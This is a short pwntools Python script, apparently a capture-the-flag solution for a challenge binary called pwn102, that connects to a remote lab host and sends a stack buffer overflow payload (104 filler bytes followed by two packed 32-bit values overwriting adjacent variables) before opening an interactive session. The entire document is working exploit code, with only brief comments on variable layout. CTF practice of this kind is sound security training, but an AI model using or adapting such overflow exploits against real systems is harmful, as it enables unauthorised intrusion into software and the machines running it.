from pwn import *

elf = context.binary = ELF('./pwn102-1644307392479.pwn102')
context.log_level = 'debug'

io = remote('10.10.251.98', 9002)

offset = 104

# Declared as int which is 32-bit data type
# param2 goes first bcs it was declared earlier than param1

payload = b'A' * offset
payload += p32(0xc0d3)
payload += p32(0xc0ff33)


io.sendline(payload)
io.interactive()